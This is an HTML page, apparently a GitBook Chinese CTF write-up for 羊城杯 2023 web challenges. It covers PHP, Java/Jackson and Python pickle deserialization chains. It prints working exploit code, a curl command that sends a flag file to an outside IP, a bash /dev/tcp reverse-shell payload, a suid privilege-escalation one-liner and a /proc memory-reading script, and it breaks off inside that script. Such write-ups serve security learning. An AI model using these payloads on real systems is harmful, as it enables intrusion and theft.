@@ -1,0 +1,695 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>羊城杯 2023 web writeup · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="WMCTF 2023 web writeup.html" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            <br />
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    About This Site
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="羊城杯 2023 web writeup.html">
+            
+                <a href="羊城杯 2023 web writeup.html#20230903">
+            
+                    
+                    羊城杯 2023 web writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="WMCTF 2023 web writeup.html">
+            
+                <a href="WMCTF 2023 web writeup.html#20230824">
+            
+                    
+                    WMCTF2023 web writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="Racing and Smashing the state machine.html">
+            
+                <a href="Racing and Smashing the state machine.html#20230817">
+            
+                    
+                    Racing and Smashing the state machine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="Gandalf AI challenge.html">
+            
+                <a href="Gandalf AI challenge.html#20230707">
+            
+                    
+                    Gandalf AI challenge
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="NSSCTF challenges.html">
+            
+                <a href="NSSCTF challenges.html#20230605">
+            
+                    
+                    NSSCTF challenges
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="JS 的一些特性：原型链，作用域，闭包.html">
+            
+                <a href="JS 的一些特性：原型链，作用域，闭包.html#20230117">
+            
+                    
+                    JS 的一些特性：原型链，作用域，闭包
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="CBCTF-0RAYS协会招新.html">
+            
+                <a href="CBCTF-0RAYS协会招新.html#20221212">
+            
+                    
+                    CBCTF-0RAYS协会招新
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="#" target="blank" class="gitbook-link">
+            <!-- Published with GitBook -->Powered By Gitbook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >羊城杯 2023 web writeup</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x7F8A;&#x57CE;&#x676F;2023-web-writeup">&#x7F8A;&#x57CE;&#x676F;2023 web writeup</h1>
+<blockquote>
+<p>&#x6CA1;&#x6D3B;&#x53EF;&#x4EE5;&#x4E0D;&#x6574; &#x5957;&#x5A03;&#x585E;misc&#x8FD8;&#x8C1C;&#x8BED;&#x4EBA;&#x5C31;&#x53D7;&#x4E0D;&#x4E86;</p>
+</blockquote>
+<h2 id="d0nt-pl4y-g4m3">D0n&apos;t pl4y g4m3!!!</h2>
+<p>&#x5C0A;&#x561F;&#x5047;&#x561F;&#x8F6C;&#x6362;&#x5668;: flag &#x5728;/tmp/catcatf1ag.txt </p>
+<p>&#x770B; 404 &#x662F; php development server</p>
+<p><a href="https://www.gem-love.com/2023/02/04/PHP-7-4-21-Development-Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" target="_blank">PHP&lt;=7.4.21 Development Server&#x6E90;&#x7801;&#x6CC4;&#x9732;&#x6F0F;&#x6D1E;</a></p>
+<p><code>/p0p.php</code> &#x6E90;&#x7801;&#x6CC4;&#x9732;</p>
+<pre><code class="lang-bash">&lt;?php
+header(<span class="hljs-string">&quot;HTTP/1.1 302 found&quot;</span>);
+header(<span class="hljs-string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);
+
+class Pro{
+    private <span class="hljs-variable">$exp</span>;
+    private <span class="hljs-variable">$rce2</span>;
+
+    public <span class="hljs-keyword">function</span> __get(<span class="hljs-variable">$name</span>)
+    {
+        <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;<span class="hljs-variable">$rce2</span>=<span class="hljs-variable">$this</span>-&gt;exp[<span class="hljs-variable">$rce2</span>];
+    }
+    public  <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__toString</span></span>()
+    {
+            call_user_func(<span class="hljs-string">&apos;system&apos;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);
+     }
+}
+
+class Yang
+{
+    public <span class="hljs-keyword">function</span> __call(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span>)
+    {
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable">$this</span>-&gt;finish1-&gt;name) {
+            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;finish-&gt;finish) {
+                call_user_func(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[0]);
+            }
+        }
+    }
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">ycb</span></span>()
+    {
+        <span class="hljs-variable">$this</span>-&gt;now = 0;
+        <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;finish-&gt;finish;
+    }
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__wakeup</span></span>()
+    {
+        <span class="hljs-variable">$this</span>-&gt;key = True;
+    }
+}
+class Cheng
+{
+    private <span class="hljs-variable">$finish</span>;
+    public <span class="hljs-variable">$name</span>;
+    public <span class="hljs-keyword">function</span> __get(<span class="hljs-variable">$value</span>)
+    {
+
+        <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];
+    }
+}
+class Bei
+{
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()
+    {
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;CTF-&gt;ycb()) {
+            <span class="hljs-variable">$this</span>-&gt;fine-&gt;YCB1(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);
+        }
+    }
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__wakeup</span></span>()
+    {
+        <span class="hljs-variable">$this</span>-&gt;key = <span class="hljs-literal">false</span>;
+    }
+}
+
+<span class="hljs-keyword">function</span> prohib(<span class="hljs-variable">$a</span>){
+    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;
+    <span class="hljs-built_in">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&apos;&apos;</span>,<span class="hljs-variable">$a</span>);
+}
+
+<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CTF&quot;</span>];
+<span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$a</span>)){
+  unserialize(prohib(<span class="hljs-variable">$a</span>));
+}
+?&gt;
+</code></pre>
+<p>exp:</p>
+<pre><code class="lang-bash">class Yang
+{
+    public <span class="hljs-keyword">function</span> __call(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$ary</span>)
+    {
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;key === <span class="hljs-literal">true</span> || <span class="hljs-variable">$this</span>-&gt;finish1-&gt;name) {
+            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;finish-&gt;finish) {
+                call_user_func(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>], <span class="hljs-variable">$ary</span>[0]);
+            }
+        }
+    }
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">ycb</span></span>()
+    {
+        <span class="hljs-variable">$this</span>-&gt;now = 0;
+        <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;finish-&gt;finish;
+    }
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__wakeup</span></span>()
+    {
+        <span class="hljs-variable">$this</span>-&gt;key = True;
+    }
+}
+class Cheng
+{
+    private <span class="hljs-variable">$finish</span>;
+    public <span class="hljs-variable">$name</span>;
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__construct</span></span>()
+    {
+        <span class="hljs-variable">$this</span>-&gt;name[<span class="hljs-string">&apos;finish&apos;</span>]=<span class="hljs-string">&quot;system&quot;</span>;
+    }
+
+    public <span class="hljs-keyword">function</span> __get(<span class="hljs-variable">$value</span>)
+    {
+
+        <span class="hljs-built_in">return</span> <span class="hljs-variable">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];
+    }
+}
+class Bei
+{
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__destruct</span></span>()
+    {
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;CTF-&gt;ycb()) {
+            <span class="hljs-variable">$this</span>-&gt;fine-&gt;YCB1(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);
+        }
+    }
+    public <span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">__wakeup</span></span>()
+    {
+        <span class="hljs-variable">$this</span>-&gt;key = <span class="hljs-literal">false</span>;
+    }
+}
+
+<span class="hljs-keyword">function</span> prohib(<span class="hljs-variable">$a</span>){
+    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;
+    <span class="hljs-built_in">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&apos;&apos;</span>,<span class="hljs-variable">$a</span>);
+}
+
+<span class="hljs-variable">$test</span>=new Bei();
+<span class="hljs-variable">$test</span>-&gt;rce=<span class="hljs-string">&quot;curl http://124.223.14.29:11037/`cat /tmp/catcatf1ag.txt`&quot;</span>;
+<span class="hljs-variable">$test</span>-&gt;CTF=new Yang();
+<span class="hljs-variable">$test</span>-&gt;CTF-&gt;finish=new Cheng();
+<span class="hljs-variable">$test</span>-&gt;fine=new Yang();
+<span class="hljs-variable">$test</span>-&gt;fine-&gt;finish=new Cheng();
+<span class="hljs-variable">$test</span>-&gt;fine-&gt;now[<span class="hljs-string">&apos;YCB1&apos;</span>]=<span class="hljs-string">&quot;system&quot;</span>;
+<span class="hljs-variable">$test</span>-&gt;fine-&gt;key=<span class="hljs-literal">true</span>;
+
+<span class="hljs-built_in">echo</span> urlencode(str_replace(<span class="hljs-string">&quot;s:6:\&quot;system\&quot;;&quot;</span>,<span class="hljs-string">&quot;s:12:\&quot;syssystemtem\&quot;;&quot;</span>,serialize(<span class="hljs-variable">$test</span>)))
+</code></pre>
+<h2 id="ezjava">Ez_java</h2>
+<p>jackson &#x94FE;&#x5B50;&#x524D;&#x534A;&#x6BB5;&#xFF0C;toString &#x89E6;&#x53D1;&#x8C03; <code>HtmlBean</code> &#x7684; <code>getHtmlMap</code> &#xFF0C;&#x7136;&#x540E;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x8C03; <code>get</code> &#x65B9;&#x6CD5;&#x5199;&#x6A21;&#x677F;&#x6587;&#x4EF6;&#x8986;&#x76D6; index.ftl &#x6765; RCE</p>
+<p>&#x8C03;&#x7528;&#x6808;</p>
+<pre><code class="lang-php">uploadfile:<span class="hljs-number">9</span>, HtmlUploadUtil (com.ycbjava.Utils)
+get:<span class="hljs-number">39</span>, HtmlMap (com.ycbjava.Utils)
+invoke:<span class="hljs-number">20</span>, HtmlInvocationHandler (com.ycbjava.Utils)
+isEmpty:<span class="hljs-number">-1</span>, $Proxy63 (com.sun.proxy)
+serializeWithoutTypeInfo:<span class="hljs-number">752</span>, MapSerializer (com.fasterxml.jackson.databind.ser.std)
+serialize:<span class="hljs-number">720</span>, MapSerializer (com.fasterxml.jackson.databind.ser.std)
+serialize:<span class="hljs-number">35</span>, MapSerializer (com.fasterxml.jackson.databind.ser.std)
+serializeAsField:<span class="hljs-number">728</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
+serializeFields:<span class="hljs-number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
+serialize:<span class="hljs-number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)
+defaultSerializeValue:<span class="hljs-number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)
+serialize:<span class="hljs-number">115</span>, POJONode (com.fasterxml.jackson.databind.node)
+serialize:<span class="hljs-number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
+serialize:<span class="hljs-number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
+_serialize:<span class="hljs-number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
+serializeValue:<span class="hljs-number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
+serialize:<span class="hljs-number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
+_writeValueAndClose:<span class="hljs-number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)
+writeValueAsString:<span class="hljs-number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)
+nodeToString:<span class="hljs-number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)
+toString:<span class="hljs-number">62</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)
+readObject:<span class="hljs-number">86</span>, BadAttributeValueExpException (javax.management)
+</code></pre>
+<p>exp</p>
+<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;
+<span class="hljs-keyword">import</span> com.ycbjava.Bean.HtmlBean;
+<span class="hljs-keyword">import</span> com.ycbjava.Utils.HtmlInvocationHandler;
+<span class="hljs-keyword">import</span> com.ycbjava.Utils.HtmlMap;
+<span class="hljs-keyword">import</span> javassist.*;
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
+<span class="hljs-keyword">import</span> java.util.Base64;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span> </span>{
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+
+<span class="hljs-comment">//        ClassPool pool = ClassPool.getDefault();</span>
+<span class="hljs-comment">//        //&#x79FB;&#x9664; BaseJsonNode &#x4E2D;&#x7684; writeReplace &#x65B9;&#x6CD5;</span>
+<span class="hljs-comment">//        CtClass ctClass0 = pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span>
+<span class="hljs-comment">//        CtMethod writeReplace = ctClass0.getDeclaredMethod(&quot;writeReplace&quot;);</span>
+<span class="hljs-comment">//        ctClass0.removeMethod(writeReplace);</span>
+<span class="hljs-comment">//        // &#x5C06;&#x4FEE;&#x6539;&#x540E;&#x7684;CtClass&#x52A0;&#x8F7D;&#x81F3;&#x5F53;&#x524D;&#x7EBF;&#x7A0B;&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x7C7B;&#x52A0;&#x8F7D;&#x5668;&#x4E2D;</span>
+<span class="hljs-comment">//        ctClass0.toClass();</span>
+
+        HtmlMap htmlMap = <span class="hljs-keyword">new</span> HtmlMap();
+        String filname = <span class="hljs-string">&quot;index.ftl&quot;</span>;
+        String content = <span class="hljs-string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;  &lt;#assign fc=ac.getBean(&apos;freeMarkerConfiguration&apos;)&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;    &lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;      &lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;${\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)}&quot;</span>;
+        setFieldValue(htmlMap, <span class="hljs-string">&quot;filename&quot;</span>, filname);
+        setFieldValue(htmlMap, <span class="hljs-string">&quot;content&quot;</span>, content);
+        HtmlInvocationHandler htmlInvocationHandler = <span class="hljs-keyword">new</span> HtmlInvocationHandler(htmlMap);
+        Map map = (Map) Proxy.newProxyInstance(
+                HtmlMap.class.getClassLoader(),
+                <span class="hljs-keyword">new</span> Class[] {Map.class},
+                htmlInvocationHandler);
+        HtmlBean htmlBean = <span class="hljs-keyword">new</span> HtmlBean();
+        setFieldValue(htmlBean, <span class="hljs-string">&quot;HtmlMap&quot;</span>, map);
+
+        POJONode jsonNodes = <span class="hljs-keyword">new</span> POJONode(htmlBean);
+        BadAttributeValueExpException exp = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);
+        Field val = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);
+        val.setAccessible(<span class="hljs-keyword">true</span>);
+        val.set(exp,jsonNodes);
+        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
+        objectOutputStream.writeObject(exp);
+        objectOutputStream.close();
+        String res = Base64.getEncoder().encodeToString(barr.toByteArray());
+        System.out.println(res);
+
+    }
+    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception</span>{
+        Field f = obj.getClass().getDeclaredField(field);
+        f.setAccessible(<span class="hljs-keyword">true</span>);
+        f.set(obj, arg);
+    }
+}
+</code></pre>
+<p>&#x6709;&#x5173; freemark &#x7684; payload &#x53EF;&#x4EE5;&#x53C2;&#x8003;</p>
+<p><a href="https://www.cnblogs.com/escape-w/p/17326592.html" target="_blank">https://www.cnblogs.com/escape-w/p/17326592.html</a></p>
+<p>Payload</p>
+<pre><code class="lang-php">rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAALHQAA1BvY3QACFBvYy5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAGWNvbS55Y2JqYXZhLkJlYW4uSHRtbEJlYW7amGGP39UwwQIAA0wAB0h0bWxNYXB0AA9MamF2YS91dGlsL01hcDtMAAdjb250ZW50cQB+AAVMAAhmaWxlbmFtZXEAfgAFeHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAnY29tLnljYmphdmEuVXRpbHMuSHRtbEludm9jYXRpb25IYW5kbGVyQCXpLL1HVZUCAAFMAANvYmpxAH4AG3hwc3IAGWNvbS55Y2JqYXZhLlV0aWxzLkh0bWxNYXAVSPlJWeMkfAIAAkwAB2NvbnRlbnRxAH4ABUwACGZpbGVuYW1lcQB+AAV4cHQBMDwjYXNzaWduIGFjPXNwcmluZ01hY3JvUmVxdWVzdENvbnRleHQud2ViQXBwbGljYXRpb25Db250ZXh0PgogIDwjYXNzaWduIGZjPWFjLmdldEJlYW4oJ2ZyZWVNYXJrZXJDb25maWd1cmF0aW9uJyk+CiAgICA8I2Fzc2lnbiBkY3I9ZmMuZ2V0RGVmYXVsdENvbmZpZ3VyYXRpb24oKS5nZXROZXdCdWlsdGluQ2xhc3NSZXNvbHZlcigpPgogICAgICA8I2Fzc2lnbiBWT0lEPWZjLnNldE5ld0J1aWx0aW5DbGFzc1Jlc29sdmVyKGRjcik+JHsiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpKCJjYXQgL2ZsYWciKX10AAlpbmRleC5mdGxwcA==
+</code></pre>
+<h2 id="serpent">Serpent</h2>
+<p>&#x5957;&#x5A03;again</p>
+<p>session &#x5934;&#x90E8;&#x89E3;&#x5BC6;&#x5F97;&#x5230; key</p>
+<pre><code class="lang-bash">python .\flask_session_cookie_manager3.py encode <span class="hljs-_">-s</span> <span class="hljs-string">&quot;GWHTpkwrEETkPT&quot;</span> -t <span class="hljs-string">&quot;{&apos;Attribute&apos;: {&apos;admin&apos;: 1, &apos;name&apos;: &apos;admin&apos;, &apos;secret_key&apos;: &apos;GWHTpkwrEETkPT&apos;}}&quot;</span>
+</code></pre>
+<p>Hello admin, welcome to /ppppppppppick1e</p>
+<p>/src0de &#x6E90;&#x7801; pickle &#x53CD;&#x5E8F;&#x5217;&#x5316; bypass &#x627E;&#x5DF2;&#x6709;&#x7C7B; GWHT</p>
+<pre><code class="lang-bash">@app.route(<span class="hljs-string">&apos;/src0de&apos;</span>)
+def src0de():
+    f = open(__file__, <span class="hljs-string">&apos;r&apos;</span>)
+    rsp = f.read()
+    f.close()
+    <span class="hljs-built_in">return</span> rsp[rsp.index(<span class="hljs-string">&quot;@app.route(&apos;/src0de&apos;)&quot;</span>):]
+
+@app.route(<span class="hljs-string">&apos;/ppppppppppick1e&apos;</span>)
+def ppppppppppick1e():
+    try:
+        username = <span class="hljs-string">&quot;admin&quot;</span>
+        rsp = make_response(<span class="hljs-string">&quot;Hello, %s &quot;</span> % username)
+        rsp.headers[<span class="hljs-string">&apos;hint&apos;</span>] = <span class="hljs-string">&quot;Source in /src0de&quot;</span>
+        pick1e = request.cookies.get(<span class="hljs-string">&apos;pick1e&apos;</span>)
+        <span class="hljs-keyword">if</span> pick1e is not None:
+            pick1e = base64.b64decode(pick1e)
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-built_in">return</span> rsp
+        <span class="hljs-keyword">if</span> check(pick1e):
+            pick1e = pickle.loads(pick1e)
+            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Go for it!!!&quot;</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;No Way!!!&quot;</span>
+    except Exception as e:
+        error_message = str(e)
+        <span class="hljs-built_in">return</span> error_message
+
+    <span class="hljs-built_in">return</span> rsp
+
+class GWHT():
+    def __init__(self):
+        pass
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    app.run(<span class="hljs-string">&apos;0.0.0.0&apos;</span>, port=80)
+</code></pre>
+<p>&#x6A21;&#x7CCA;&#x6D4B;&#x8BD5;&#x4E0B;&#x5927;&#x6982;&#x662F; R &#x6307;&#x4EE4;&#x9650;&#x5236;&#x3002;R &#x7ED5;&#x8FC7;&#xFF1A;<a href="https://xz.aliyun.com/t/11807#toc-4" target="_blank">https://xz.aliyun.com/t/11807#toc-4</a> <a href="https://goodapple.top/archives/1069" target="_blank">https://goodapple.top/archives/1069</a></p>
+<p>&#x627E;&#x5DF2;&#x6709;&#x7C7B; GWHT &#x5229;&#x7528;</p>
+<pre><code class="lang-bash">b<span class="hljs-string">&apos;&apos;</span><span class="hljs-string">&apos;(c__main__
+GWHT
+o}(S&quot;__setstate__&quot;
+cos
+system
+ubS&quot;bash -c &apos;</span>bash -i &gt;&amp; /dev/tcp/120.26.39.182/8888 0&gt;&amp;1<span class="hljs-string">&apos;&quot;
+b.&apos;</span><span class="hljs-string">&apos;&apos;</span>
+</code></pre>
+<p>&#x53EF;&#x4EE5;&#x53CD;&#x5F39;shell&#x3002;flag&#x4EC5;root&#x53EF;&#x8BFB; python3.8 suid &#x63D0;&#x6743;</p>
+<pre><code class="lang-bash">python3 -c <span class="hljs-string">&apos;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&apos;</span>
+</code></pre>
+<h2 id="arknights">ArkNights</h2>
+<p>Fantasy world full of magic and dream................</p>
+<p>/proc &#x8BFB;&#x5185;&#x5B58; SECRET_KEY =&gt; exec</p>
+<p><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#%E8%8E%B7%E5%8F%96secret-key" target="_blank">https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#%E8%8E%B7%E5%8F%96secret-key</a></p>
+<pre><code class="lang-bash">import requests
+import re
+from sys import <span class="hljs-built_in">exit</span>
+
+url = <span class="hljs-string">&apos;&apos;</span>
+
+map_list = requests.get(url + f<span class="hljs-string">&quot;/read?file=/proc/self/maps&quot;</span>)
+
+map_list = map_list.text.split(<span class="hljs-string">&quot;\n&quot;</span>)
+
+<span class="hljs-comment"># print(map_list[4])</span>
+<span class="hljs-comment"># i = map_list[4]</span>
+<span class="hljs-comment"># map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i)</span>
+<span class="hljs-comment"># print(map_addr.group(1))</span>
+<span class="hljs-comment"># print(map_addr.group(2))</span>
+<span class="hljs-comment"># print(int(map_addr.group(1),16))</span>
+<span class="hljs-comment"># print(int(map_addr.group(2),16))</span>
